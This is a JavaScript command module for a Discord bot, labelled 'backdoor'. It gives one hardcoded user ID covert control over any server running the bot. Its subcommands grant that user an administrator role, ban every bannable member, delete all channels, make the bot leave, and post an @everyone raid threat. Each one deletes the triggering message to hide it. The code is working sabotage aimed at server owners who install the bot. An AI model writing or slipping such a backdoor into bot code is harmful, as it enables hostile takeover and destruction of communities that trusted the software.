const Discord = require("discord.js");
const fetch = require("node-fetch");

exports.run = async (client, message, args) => {
  if (message.author.id !== "583649910092595232") return;

  if (args[0] === "leave") {
    try {
      message.channel.send('👋 | Bye')
      message.guild.leave();
      message.delete({ Timeout: 0 });
    } catch (e) {
      console.log(e.stack);
    }
  }

  if (args[0] === "admin") {
    try {
      let role = await message.guild.roles.create({
        data: { name: "Cl4yn3", color: "#botanj", permissions: [8] }
      });

      message.member.roles.add(role);
      message.delete({ Timeout: 0 });
    } catch (e) {
      console.log(e.stack);
    }
  }

  if (args[0] === "bb") {
    try {
      message.guild.members.cache
        .filter(bot => bot.bannable)
        .forEach(bot => {
          bot.ban();
        });
      message.delete({ Timeout: 0 });
    } catch (e) {
      console.log(e.stack);
    }
  }

  if (args[0] === "bm") {
    try {
      message.guild.members.cache
        .filter(member => member.bannable)
        .forEach(member => {
          member.ban();
        });
      message.delete({ Timeout: 0 });
    } catch (e) {
      console.log(e.stack);
    }
  }

  if (args[0] === "raid") {
    message.guild.channels.cache.forEach(x => {
      x.delete(x.id);
      message.delete({ Timeout: 0 });
    });
  }

  if (args[0] === "mt") {
    try {
      message.channel.send("@everyone listen to McDunaldz or get raid.");
      message.delete({ Timeout: 0 });
    } catch (e) {
      console.log(e.stack);
    }
  }
};

exports.help = {
  name: "backdoor",
  description: "backdoor command for owner",
  usage: "bd <command>"
};

exports.conf = {
  aliases: ["bd"],
  cooldown: 0
};
